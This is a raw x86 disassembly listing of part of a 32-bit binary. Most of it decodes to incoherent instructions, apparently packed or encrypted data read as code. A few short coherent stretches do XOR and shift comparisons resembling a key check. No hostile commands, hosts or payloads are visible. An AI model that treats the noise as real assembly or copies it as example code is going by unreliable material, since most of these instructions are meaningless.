  41b17e:	mov    DWORD PTR [edi-0x28],ebp
  41b181:	into   
  41b182:	aas    
  41b183:	and    edx,DWORD PTR [edx+0x6d0c35de]
  41b189:	cmp    edx,DWORD PTR [ecx-0x6433d5d]
  41b18f:	mov    edi,0x32d57b53
  41b194:	mov    ch,0x36
  41b196:	imul   eax,edx,0xffffffb8
  41b199:	out    dx,eax
  41b19a:	jg     0x41b1d1
  41b19c:	sbb    esi,DWORD PTR [ecx-0x48]
  41b19f:	es in  al,dx
  41b1a1:	xor    ch,BYTE PTR [ecx-0x583f451d]
  41b1a7:	dec    ebp
  41b1a8:	sahf   
  41b1a9:	inc    ecx
  41b1aa:	test   bl,dh
  41b1ac:	sub    al,0x88
  41b1ae:	xor    edi,esi
  41b1b0:	repnz add ch,cl
  41b1b3:	leave  
  41b1b4:	inc    esi
  41b1b5:	out    dx,al
  41b1b6:	pop    edx
  41b1b7:	in     ax,0x17
  41b1ba:	pop    ebp
  41b1bb:	cmp    ebp,ebx
  41b1bd:	mov    edx,0x49f9b233
  41b1c2:	mov    bh,0xd2
  41b1c4:	frstpm(287 only) 
  41b1c6:	or     dh,bl
  41b1c8:	(bad)  
  41b1c9:	cdq    
  41b1ca:	add    esi,DWORD PTR [edx]
  41b1cc:	fdiv   QWORD PTR [edi]
  41b1ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1cf:	aaa    
  41b1d0:	addr16 mov ebx,0x96710fe0
  41b1d6:	iret   
  41b1d7:	jno    0x41b16c
  41b1d9:	xchg   ebx,eax
  41b1da:	shl    ah,1
  41b1dc:	sbb    ebp,0xfffffff2
  41b1df:	shl    BYTE PTR [edx+0x3e],1
  41b1e2:	jmp    0x41b257
  41b1e4:	sahf   
  41b1e5:	and    al,0xaf
  41b1e7:	addr16 imul ebp,esp,0xffffff91
  41b1eb:	xchg   esi,eax
  41b1ec:	mov    esp,0xb1fbc222
  41b1f1:	js     0x41b1c1
  41b1f3:	test   BYTE PTR [edx],0x28
  41b1f6:	test   eax,0xe855c5db
  41b1fb:	jl     0x41b24f
  41b1fd:	lds    esp,FWORD PTR [ecx]
  41b1ff:	bound  edx,QWORD PTR [ebp+0x16d7172a]
  41b205:	inc    ebx
  41b206:	and    eax,0x3c1bac9f
  41b20b:	jb     0x41b273
  41b20d:	stos   BYTE PTR es:[edi],al
  41b20e:	dec    edx
  41b20f:	jecxz  0x41b276
  41b211:	mov    al,0x9a
  41b213:	cdq    
  41b214:	sbb    al,0xe5
  41b216:	pop    eax
  41b217:	add    eax,0xc85666ad
  41b21c:	sub    BYTE PTR [esi],al
  41b21e:	adc    al,BYTE PTR [ecx+0x3a1fa2ae]
  41b224:	(bad)  
  41b226:	pop    ebp
  41b227:	scas   eax,DWORD PTR es:[edi]
  41b228:	gs or  eax,0xbc63d58
  41b22e:	inc    edi
  41b22f:	ins    DWORD PTR es:[edi],dx
  41b230:	out    dx,al
  41b231:	in     al,dx
  41b232:	pop    ds
  41b233:	sar    DWORD PTR [ecx+0x13ca1db8],cl
  41b239:	pop    esi
  41b23a:	das    
  41b23b:	add    edi,esi
  41b23d:	xor    al,0x2f
  41b23f:	sub    esi,DWORD PTR [edi]
  41b241:	xchg   ecx,eax
  41b242:	jmp    0x7ccc:0xf08d8f57
  41b249:	mov    al,ds:0x9c2048dd
  41b24e:	xor    eax,DWORD PTR ds:0x93d4cdd0
  41b254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b255:	fs in  al,0xa
  41b258:	out    0xf0,eax
  41b25a:	fs mov ecx,0x58412342
  41b260:	inc    eax
  41b261:	sar    DWORD PTR es:[edi],0xe9
  41b265:	sub    BYTE PTR [esp+ecx*1+0x52348fd7],ah
  41b26c:	or     DWORD PTR [ebp+0x7f],0xffffff98
  41b270:	and    ebp,DWORD PTR [eax+0x1f27eae5]
  41b276:	lock addr16 xor eax,eax
  41b27a:	and    BYTE PTR [edi+0x51],0x36
  41b27e:	sti    
  41b27f:	jnp    0x41b239
  41b281:	mov    ds:0x9e57fba6,al
  41b286:	pop    edi
  41b287:	add    bl,BYTE PTR [edi+0x994c222]
  41b28d:	xchg   esp,eax
  41b28e:	mov    edi,DWORD PTR [eax+0x4fd42c5c]
  41b294:	push   ecx
  41b295:	pop    ss
  41b296:	mov    ebx,0xdc70c6e1
  41b29b:	mov    esp,DWORD PTR [edx]
  41b29d:	hlt    
  41b29e:	sbb    DWORD PTR [ecx],ebx
  41b2a0:	lea    edx,[ecx+eax*2-0x10b08c14]
  41b2a7:	cmp    DWORD PTR [eax*4-0x1f170d18],eax
  41b2ae:	mov    al,0x21
  41b2b0:	(bad)  
  41b2b1:	das    
  41b2b2:	fimul  WORD PTR [eax-0x54]
  41b2b5:	dec    ecx
  41b2b6:	stos   WORD PTR es:[edi],ax
  41b2b8:	sbb    esp,0xcf24a05e
  41b2be:	fst    DWORD PTR [edi]
  41b2c0:	or     ebp,ebx
  41b2c2:	inc    edi
  41b2c3:	call   0xd8421415
  41b2c8:	add    DWORD PTR [edi-0x57],0x9a12b9ec
  41b2cf:	jle    0x41b2ab
  41b2d1:	mov    al,0x3c
  41b2d3:	dec    eax
  41b2d4:	js     0x41b2b2
  41b2d6:	mul    BYTE PTR [ecx]
  41b2d8:	xchg   edi,eax
  41b2d9:	jl     0x41b2d1
  41b2db:	cwde   
  41b2dc:	mov    eax,0xdd786606
  41b2e1:	cmp    esi,edi
  41b2e3:	gs cs pop esp
  41b2e6:	sub    dh,BYTE PTR [eax+0xc]
  41b2e9:	jae    0x41b302
  41b2eb:	sar    BYTE PTR [esi+0x60222a63],0x2b
  41b2f2:	out    dx,al
  41b2f3:	xchg   esi,eax
  41b2f4:	sar    BYTE PTR [edx-0x28],0x39
  41b2f8:	enter  0x485d,0xe5
  41b2fc:	dec    edi
  41b2fd:	fisttp QWORD PTR [eax]
  41b2ff:	cmp    cl,ch
  41b301:	xor    BYTE PTR [ebp+0x64],0xa2
  41b305:	sti    
  41b306:	adc    ecx,edi
  41b308:	mov    edx,0x31a16dcf
  41b30d:	jbe    0x41b370
  41b30f:	xor    al,0x25
  41b311:	syscall 
  41b313:	jmp    DWORD PTR [ebp+edi*8-0x69]
  41b317:	push   eax
  41b318:	fsin   
  41b31a:	addr16 xchg esi,eax
  41b31c:	data16 mov al,ds:0xa0161ab4
  41b322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b323:	push   esi
  41b324:	cmp    edx,esp
  41b326:	adc    BYTE PTR [eax+0x4bb75917],dl
  41b32c:	sbb    al,0x9d
  41b32e:	push   ds
  41b32f:	add    DWORD PTR [eax],eax
  41b331:	lock mov cl,0x25
  41b334:	dec    ebp
  41b335:	xchg   DWORD PTR [edi-0x7f7b4568],edx
  41b33b:	mov    edi,0x77f28173
  41b340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b341:	jns    0x41b30d
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	aaa    
  41b368:	push   es
  41b369:	lahf   
  41b36a:	jo     0x41b327
  41b36c:	(bad)  
  41b36d:	push   ss
  41b36e:	sbb    BYTE PTR [edx+edx*1-0x5db8e7e8],bh
  41b375:	xor    al,0x30
  41b377:	cld    
  41b378:	sbb    DWORD PTR [ebp+esi*8-0x101e2f97],ecx
  41b37f:	cmp    DWORD PTR [eax+0x70],0x52f13e01
  41b386:	sbb    ebx,DWORD PTR [ebp+0x2d05a4ab]
  41b38c:	dec    ecx
  41b38d:	adc    BYTE PTR ds:0x9240de98,0x69
  41b394:	addr16 push ecx
  41b396:	dec    ecx
  41b397:	mov    al,ds:0xe2703abb
  41b39c:	cld    
  41b39d:	inc    esp
  41b39e:	mov    ch,0xe1
  41b3a0:	mov    WORD PTR [ecx+0x4],ds
  41b3a3:	lahf   
  41b3a4:	mul    al
  41b3a6:	mov    esp,0xdd733b5c
  41b3ab:	dec    ecx
  41b3ac:	mov    ecx,0x3d729ebe
  41b3b1:	mov    eax,0xf6f3416b
  41b3b6:	out    0x79,eax
  41b3b8:	mov    ?,WORD PTR [esi+eax*4]
  41b3bb:	stos   DWORD PTR es:[edi],eax
  41b3bc:	or     DWORD PTR [esi],edi
  41b3be:	xchg   DWORD PTR [ecx+0x10],edi
  41b3c1:	xor    ecx,DWORD PTR [ebx+eax*8]
  41b3c4:	(bad)  
  41b3c5:	adc    al,0xbd
  41b3c7:	xchg   esi,eax
  41b3c8:	xor    cl,bl
  41b3ca:	add    al,0x9
  41b3cc:	mov    edx,0x6e5b15eb
  41b3d1:	mov    esp,0x6dffbc55
  41b3d6:	pop    ss
  41b3d7:	sbb    DWORD PTR [edi],ebp
  41b3d9:	mov    bh,0x4f
  41b3db:	jmp    0x6862148e
  41b3e0:	xchg   DWORD PTR [edx+0x76],esi
  41b3e3:	fist   WORD PTR [edi+ebx*1]
  41b3e6:	ins    BYTE PTR es:[edi],dx
  41b3e7:	adc    al,bh
  41b3e9:	int3   
  41b3ea:	or     al,0x26
  41b3ec:	inc    ebx
  41b3ed:	js     0x41b44b
  41b3ef:	jl     0x41b3dd
  41b3f1:	(bad)  
  41b3f2:	aas    
  41b3f3:	pop    ebx
  41b3f4:	push   ecx
  41b3f5:	ins    DWORD PTR es:[edi],dx
  41b3f6:	repz and DWORD PTR [edi],0xffffffeb
  41b3fa:	pusha  
  41b3fb:	xchg   ebx,eax
  41b3fc:	outs   dx,BYTE PTR ds:[esi]
  41b3fd:	push   ebp
  41b3fe:	sbb    BYTE PTR [esi-0x50e7c81c],al
  41b404:	xchg   ebp,eax
  41b405:	imul   eax,DWORD PTR [ebp+0x31],0xffffffdc
  41b409:	ret    0x798
  41b40c:	mov    cs:0xc4f84107,eax
  41b412:	hlt    
  41b413:	adc    DWORD PTR [ebp-0xe],edi
  41b416:	add    ebp,DWORD PTR [ebp-0x67]
  41b419:	js     0x41b451
  41b41b:	iret   
  41b41c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b41d:	pushf  
  41b41e:	push   eax
  41b41f:	pop    ss
  41b420:	sub    BYTE PTR [eax+0x7],0xb8
  41b424:	jbe    0x41b412
  41b426:	repnz not DWORD PTR [edx+edx*4+0x63c29c6]
  41b42e:	ins    BYTE PTR es:[edi],dx
  41b42f:	cmp    BYTE PTR [edi+0x60],dl
  41b432:	add    ch,al
  41b434:	sbb    BYTE PTR [edi],ch
  41b436:	xchg   edi,eax
  41b437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b438:	dec    esi
  41b439:	mov    ds:0x6d6deea6,eax
  41b43e:	cli    
  41b43f:	mov    cl,0xc1
  41b441:	ret    
  41b442:	cli    
  41b443:	stos   BYTE PTR es:[edi],al
  41b444:	dec    edx
  41b445:	mul    dl
  41b447:	xor    BYTE PTR [ebx],0xc7
  41b44a:	push   cs
  41b44b:	mov    bh,0x57
  41b44d:	cs xor dl,dh
  41b450:	xchg   ecx,eax
  41b451:	shl    DWORD PTR [ebp-0x5385078f],cl
  41b457:	and    cl,BYTE PTR [edx-0x6a012bcd]
  41b45d:	pop    eax
  41b45e:	inc    edx
  41b45f:	xchg   edi,eax
  41b460:	mov    ecx,0x4cd75c3c
  41b465:	cmp    DWORD PTR [edi+0x7f2d87e],eax
  41b46b:	pop    esi
  41b46c:	aaa    
  41b46d:	fiadd  WORD PTR [ebp+0x3e0894cb]
  41b473:	add    DWORD PTR [edi],ebx
  41b475:	das    
  41b476:	jb     0x41b489
  41b478:	mov    esp,0x798edc81
  41b47d:	push   es
  41b47e:	and    eax,0xef879c50
  41b483:	mov    al,ds:0xe56b981b
  41b488:	mov    ds:0xa0546484,eax
  41b48d:	ja     0x41b429
  41b48f:	cdq    
  41b490:	pop    esi
  41b491:	pop    eax
  41b492:	pusha  
  41b493:	jecxz  0x41b4e8
  41b495:	sahf   
  41b496:	les    ebp,FWORD PTR [esi+eiz*2+0x7f]
  41b49a:	inc    ecx
  41b49b:	lods   eax,DWORD PTR ds:[esi]
  41b49c:	xor    eax,0xd19aea34
  41b4a1:	(bad)  
  41b4a2:	loope  0x41b477
  41b4a4:	jmp    0x41b4a5
  41b4a6:	fxch   st(1)
  41b4a8:	add    ecx,DWORD PTR [ecx-0x41]
  41b4ab:	ret    0x8271
  41b4ae:	clc    
  41b4af:	ds test eax,0xf5ec7628
  41b4b5:	pop    eax
  41b4b6:	inc    DWORD PTR [ecx+eiz*4-0x63]
  41b4ba:	jo     0x41b457
  41b4bc:	sub    BYTE PTR [esi-0x68a8edd5],0xd7
  41b4c3:	push   eax
  41b4c4:	or     esp,DWORD PTR [ecx+0x1280035e]
  41b4ca:	fisttp QWORD PTR [ebx]
  41b4cc:	outs   dx,BYTE PTR ds:[esi]
  41b4cd:	pop    ecx
  41b4ce:	or     al,0x81
  41b4d0:	xor    ah,bh
  41b4d2:	jle    0x41b45a
  41b4d4:	lock or bh,BYTE PTR [ecx]
  41b4d7:	lea    edi,[esi]
  41b4d9:	test   al,0x20
  41b4db:	sysexit 
  41b4dd:	nop
  41b4de:	jp     0x41b486
  41b4e0:	xchg   BYTE PTR [edx+edi*1],dh
  41b4e3:	outs   dx,BYTE PTR ds:[esi]
  41b4e4:	iret   
  41b4e5:	push   ecx
  41b4e6:	inc    ecx
  41b4e7:	pop    ecx
  41b4e8:	pop    DWORD PTR [ecx]
  41b4ea:	fdivr  QWORD PTR [edx+eax*4-0x31]
  41b4ee:	test   DWORD PTR [esi],ecx
  41b4f0:	xchg   BYTE PTR [ecx],bh
  41b4f2:	xchg   esi,eax
  41b4f3:	dec    edi
  41b4f4:	mov    ah,0x81
  41b4f6:	xchg   ebx,eax
  41b4f7:	mov    dl,0xcb
  41b4f9:	fild   QWORD PTR [edi-0x78a626ba]
  41b4ff:	stos   BYTE PTR es:[edi],al
  41b500:	push   0x71e3d21c
  41b505:	inc    edx
  41b506:	popa   
  41b507:	and    eax,0xd744e569
  41b50c:	dec    ebp
  41b50d:	call   0x4fc0:0xb6815174
  41b514:	test   BYTE PTR [edi+0x41e6842b],bl
  41b51a:	mov    bl,ah
  41b51c:	push   es
  41b51d:	inc    edx
  41b51e:	pop    ss
  41b51f:	fist   WORD PTR [edi]
  41b521:	push   esp
  41b522:	shl    DWORD PTR [edx-0x6d451262],cl
  41b528:	mov    ds:0xb459bf0e,eax
  41b52d:	addr16 mov cl,al
  41b530:	test   eax,0xeff757c0
  41b535:	daa    
  41b536:	mov    ch,0xbe
  41b538:	lds    esi,FWORD PTR [ebp+edx*8-0x38]
  41b53c:	sub    ebx,DWORD PTR [edx]
  41b53e:	repz pop ebp
  41b540:	cwde   
  41b541:	mov    ebp,0xba6245e2
  41b546:	and    al,BYTE PTR [esi-0x3f61466f]
  41b54c:	outs   dx,DWORD PTR ds:[esi]
  41b54d:	nop
  41b54e:	mov    esi,0x540a0007
  41b553:	scas   eax,DWORD PTR es:[edi]
  41b554:	push   es
  41b555:	stos   DWORD PTR es:[edi],eax
  41b556:	cmc    
  41b557:	in     al,0xa0
  41b559:	xor    esi,DWORD PTR [edi-0x504f5897]
  41b55f:	test   eax,0x1c0969d
  41b564:	adc    BYTE PTR gs:[ebx],0xd3
  41b568:	(bad)  
  41b569:	repz std 
  41b56b:	pop    ebp
  41b56c:	ja     0x41b5b1
  41b56e:	shl    DWORD PTR [edx+0x5cb67b14],cl
  41b574:	sub    BYTE PTR [esi+0x73561fce],ah
  41b57a:	cmp    eax,0x85499f12
  41b57f:	fwait
  41b580:	pusha  
  41b581:	iret   
  41b582:	lahf   
  41b583:	les    ebp,FWORD PTR [edi+0x5b35f87c]
  41b589:	call   DWORD PTR [esp+eiz*2+0x28]
  41b58d:	xchg   edx,eax
  41b58e:	test   al,0x0
  41b590:	add    edx,ebp
  41b592:	fistp  WORD PTR [edi]
  41b594:	sar    cl,cl
  41b596:	ins    DWORD PTR es:[edi],dx
  41b597:	push   esi
  41b598:	mov    ds:0x2c93bc0e,al
  41b59d:	pop    ss
  41b59e:	je     0x41b5f4
  41b5a0:	xchg   ecx,eax
  41b5a1:	popf   
  41b5a2:	adc    eax,0xf443fedd
  41b5a7:	lea    edx,[eax-0x5d95adff]
  41b5ad:	jb     0x41b629
  41b5af:	imul   DWORD PTR [edi+ecx*8-0x23]
  41b5b3:	sub    esp,DWORD PTR [edi]
  41b5b5:	repz retf 
  41b5b7:	sub    al,0xcb
  41b5b9:	mov    eax,0x91b008a
  41b5be:	sub    ah,cl
  41b5c0:	add    DWORD PTR [eax],ebx
  41b5c2:	xor    edx,DWORD PTR [ecx+0x50d64cdf]
  41b5c8:	and    ah,BYTE PTR [edi]
  41b5ca:	(bad)  
  41b5cb:	pop    ebx
  41b5cc:	enter  0x3c82,0x93
  41b5d0:	jmp    0x41b5ab
  41b5d2:	inc    ecx
  41b5d3:	out    0x59,al
  41b5d5:	dec    ecx
  41b5d6:	pushf  
  41b5d7:	rcl    BYTE PTR [ebx+0x61b6c32b],0x1c
  41b5de:	or     eax,0x5d80320b
  41b5e3:	add    al,0x21
  41b5e5:	push   esi
  41b5e6:	mov    ecx,DWORD PTR [edx]
  41b5e8:	push   esp
  41b5e9:	xchg   ah,al
  41b5eb:	out    dx,al
  41b5ec:	xchg   esp,eax
  41b5ed:	push   DWORD PTR [edi+0x75]
  41b5f0:	loope  0x41b589
  41b5f2:	jns    0x41b5d6
  41b5f4:	out    0x55,al
  41b5f6:	nop
  41b5f7:	repnz add BYTE PTR [eax],ah
  41b5fa:	sbb    al,0xc6
  41b5fc:	cmp    BYTE PTR [esi+ebp*1],dl
  41b5ff:	pushf  
  41b600:	stos   DWORD PTR es:[edi],eax
  41b601:	je     0x41b5fe
  41b603:	pop    ebx
  41b604:	jp     0x41b5e2
  41b606:	lahf   
  41b607:	push   ebp
  41b608:	pop    ds
  41b609:	(bad)  
  41b60a:	(bad)  
  41b60b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b60c:	xlat   BYTE PTR ds:[ebx]
  41b60d:	lds    edx,FWORD PTR [edi]
  41b60f:	daa    
  41b610:	mov    esp,DWORD PTR [edi+0x79]
  41b613:	inc    edi
  41b614:	jl     0x41b67b
  41b616:	or     DWORD PTR [edx+0x1a],0x42
  41b61a:	aad    0xc2
  41b61c:	cwde   
  41b61d:	popa   
  41b61e:	pop    esp
  41b61f:	scas   eax,DWORD PTR es:[edi]
  41b620:	ss cld 
  41b622:	loop   0x41b690
  41b624:	lock adc al,0xdb
  41b627:	fidivr WORD PTR [ebx]
  41b629:	idiv   DWORD PTR fs:[ebp+0x6a]
  41b62d:	mov    cl,0xb9
  41b62f:	fsub   DWORD PTR ds:0x35648694
  41b635:	call   0x73ef612e
  41b63a:	das    
  41b63b:	(bad)  
  41b63d:	inc    esp
  41b63e:	pop    es
  41b63f:	pop    ecx
  41b640:	add    al,0x9f
  41b642:	pop    gs
  41b644:	stos   DWORD PTR es:[edi],eax
  41b645:	xor    esi,DWORD PTR [eax]
  41b647:	outs   dx,BYTE PTR ds:[esi]
  41b648:	dec    ebx
  41b649:	lds    ebx,FWORD PTR ds:[edx+eiz*8-0x3e]
  41b64e:	out    0x2c,eax
  41b650:	mov    al,0x2d
  41b652:	stos   BYTE PTR es:[edi],al
  41b653:	pop    ss
  41b654:	fmul   DWORD PTR [ecx-0x76]
  41b657:	out    dx,eax
  41b658:	mov    eax,ds:0x2a7bf71c
  41b65d:	js     0x41b6db
  41b65f:	lahf   
  41b660:	pop    ds
  41b661:	and    ecx,ebp
  41b663:	pusha  
  41b664:	aad    0xa0
  41b666:	lods   al,BYTE PTR ds:[esi]
  41b667:	out    dx,al
  41b668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b669:	ss xchg edi,ebp
  41b66c:	inc    ebp
  41b66d:	jne    0x41b600
  41b66f:	or     al,0x94
  41b671:	mov    BYTE PTR [edi],dl
  41b673:	mov    ebx,0x863555c6
  41b678:	scas   eax,DWORD PTR es:[edi]
  41b679:	int3   
  41b67a:	xor    ebx,DWORD PTR [eax+0x4f]
  41b67d:	ret    
  41b67e:	ja     0x41b66b
  41b680:	std    
  41b681:	push   ecx
  41b682:	or     eax,DWORD PTR [eax+0x56]
  41b685:	inc    ebp
  41b686:	or     al,0x96
  41b688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b689:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b68a:	cli    
  41b68b:	mov    ebp,0xd645ce99
  41b690:	mov    al,0x74
  41b692:	sub    DWORD PTR [ebx-0x5bf7796b],ebp
  41b698:	fldenv [eax]
  41b69a:	sub    BYTE PTR [edx-0x55],ch
  41b69d:	retf   
  41b69e:	test   ch,bl
  41b6a0:	int3   
  41b6a1:	cs jle 0x41b6e7
  41b6a4:	cmp    eax,0xab2d2cfc
  41b6a9:	repz xor cl,BYTE PTR [ecx]
  41b6ac:	clc    
  41b6ad:	xchg   ecx,eax
  41b6ae:	pop    eax
  41b6af:	mov    eax,DWORD PTR ds:0x32a756fb
  41b6b5:	(bad)
  41b6ba:	push   edx
  41b6bb:	sbb    edi,DWORD PTR [eax]
  41b6bd:	das    
  41b6be:	pop    ebp
  41b6bf:	je     0x41b6c3
  41b6c1:	daa    
  41b6c2:	dec    esp
  41b6c3:	xor    DWORD PTR [ebp+0x3f99036b],ecx
  41b6c9:	jg     0x41b724
  41b6cb:	int3   
  41b6cc:	ror    BYTE PTR [esi+ebx*2+0x614f0351],0x7e
  41b6d4:	mov    cl,0x9
  41b6d6:	repnz mov ecx,0x44e7551b
  41b6dc:	out    0x7f,eax
  41b6de:	sbb    dh,BYTE PTR [ebp+eiz*8+0x48bdc0f7]
  41b6e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6e6:	lods   eax,DWORD PTR ds:[esi]
  41b6e7:	jns    0x41b6f0
  41b6e9:	sbb    BYTE PTR [edi+0x4b],bh
  41b6ec:	inc    edi
  41b6ed:	pop    edi
  41b6ee:	stos   WORD PTR es:[edi],ax
  41b6f0:	dec    edx
  41b6f1:	jb     0x41b70b
  41b6f3:	nop
  41b6f4:	sbb    BYTE PTR [edi+ebp*2-0x199962b3],ch
  41b6fb:	sub    BYTE PTR [edx],ch
  41b6fd:	mov    bl,0xa2
  41b6ff:	xor    BYTE PTR [edi+0x19],dl
  41b702:	or     eax,0x3ccc1710
  41b707:	sub    BYTE PTR [ecx],ch
  41b709:	arpl   cx,dx
  41b70b:	in     al,0xe3
  41b70d:	sub    DWORD PTR [ecx],esi
  41b70f:	(bad)  
  41b710:	mov    ebp,0x41e6140f
  41b715:	stos   BYTE PTR es:[edi],al
  41b716:	xchg   edi,eax
  41b717:	scas   al,BYTE PTR es:[edi]
  41b718:	(bad)  
  41b719:	into   
  41b71a:	leave  
  41b71b:	pop    edi
  41b71c:	(bad)  [eax-0x25]
  41b71f:	push   esi
  41b720:	out    dx,eax
  41b721:	sub    DWORD PTR [edi+0x47],0xffffffe4
  41b725:	shl    eax,0x1e
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x4225b4
  41b758:	mov    DWORD PTR [esp+0x68],0x4225ac
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x42253c
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx-0x5055d674],dh
  41b815:	cmp    ebp,DWORD PTR [edi-0x50]
  41b818:	pop    esi
  41b819:	mov    DWORD PTR [esi],edx
  41b81b:	sbb    BYTE PTR [edx+edx*1-0x2ad6e7e8],bh
  41b822:	jae    0x41b853
  41b824:	sub    BYTE PTR [ebx-0x1c],cl
  41b827:	loopne 0x41b813
  41b829:	mov    bl,0xf4
  41b82b:	or     BYTE PTR [ebx-0x75b29134],0x53
  41b832:	mov    eax,ds:0x7d44390a
  41b837:	mov    WORD PTR [ebp-0xbf47257],gs
  41b83d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b83e:	xchg   esp,eax
  41b83f:	pop    esp
  41b840:	in     al,0x1c
  41b842:	and    ebp,DWORD PTR [edi-0x3c]
  41b845:	js     0x41b84c
  41b847:	pop    eax
  41b848:	std    
  41b849:	test   bh,ah
  41b84b:	lds    ecx,FWORD PTR [ecx]
  41b84d:	push   ebx
  41b84e:	int    0x56
  41b850:	dec    esi
  41b851:	inc    ecx
  41b852:	fidivr DWORD PTR [ebx+0x2a5dfbf8]
  41b858:	dec    esp
  41b859:	sbb    al,0xb1
  41b85b:	xchg   BYTE PTR [ebx],bh
  41b85d:	inc    esp
  41b85e:	or     DWORD PTR [ebp+0x43],edx
  41b861:	push   ecx
  41b862:	sub    DWORD PTR [edx],esi
  41b864:	pop    ss
  41b865:	pop    edx
  41b866:	jnp    0x41b8db
  41b868:	sti    
  41b869:	adc    dh,ch
  41b86b:	or     al,0x31
  41b86d:	sub    al,0xec
  41b86f:	cwde   
  41b870:	mov    bh,0x51
  41b872:	xchg   esp,eax
  41b873:	inc    esi
  41b874:	lea    edx,[edx+eiz*4-0x3d]
  41b878:	xchg   ecx,eax
  41b879:	aam    0x2f
  41b87b:	inc    esi
  41b87c:	mov    ss,eax
  41b87e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b87f:	sub    dh,dh
  41b881:	sbb    bh,BYTE PTR [edx-0x73543023]
  41b887:	or     DWORD PTR ds:0xd1616d28,ebp
  41b88d:	cmp    al,0x6c
  41b88f:	out    0xfe,al
  41b891:	add    DWORD PTR [edx-0x2cd18cc3],edi
  41b897:	test   al,0xaf
  41b899:	xchg   ecx,eax
  41b89a:	pushf  
  41b89b:	pop    esp
  41b89c:	test   DWORD PTR [ebp-0x39c0dfcf],esp
  41b8a2:	sahf   
  41b8a3:	rol    DWORD PTR [eax+0x6],1
  41b8a6:	scas   eax,DWORD PTR es:[edi]
  41b8a7:	cmp    al,0xab
  41b8a9:	std    
  41b8aa:	out    dx,eax
  41b8ab:	nop
  41b8ac:	xchg   ecx,eax
  41b8ad:	jmp    0x4694:0xfbb0c0ca
  41b8b4:	lds    edx,FWORD PTR [ebp-0x7e38971a]
  41b8ba:	ja     0x41b927
  41b8bc:	xor    al,0xd0
  41b8be:	xor    DWORD PTR [edi],edi
  41b8c0:	push   0xffffffb5
  41b8c2:	inc    esi
  41b8c3:	lahf   
  41b8c4:	pop    eax
  41b8c5:	gs push ds
  41b8c7:	dec    esp
  41b8c8:	mov    fs,edx
  41b8ca:	retf   
  41b8cb:	mov    ah,0xc8
  41b8cd:	cld    
  41b8ce:	mov    eax,0x9d218bd5
  41b8d3:	sub    esi,DWORD PTR [esi-0x1e]
  41b8d6:	pop    esi
  41b8d7:	outs   dx,BYTE PTR ds:[esi]
  41b8d8:	mov    ah,0xfa
  41b8da:	test   al,0x84
  41b8dc:	pushf  
  41b8dd:	or     al,0xf6
  41b8df:	jmp    0x11e17170
  41b8e4:	test   eax,0x372ec56e
  41b8e9:	clc    
  41b8ea:	out    0x32,al
  41b8ec:	inc    ebp
  41b8ed:	es cdq 
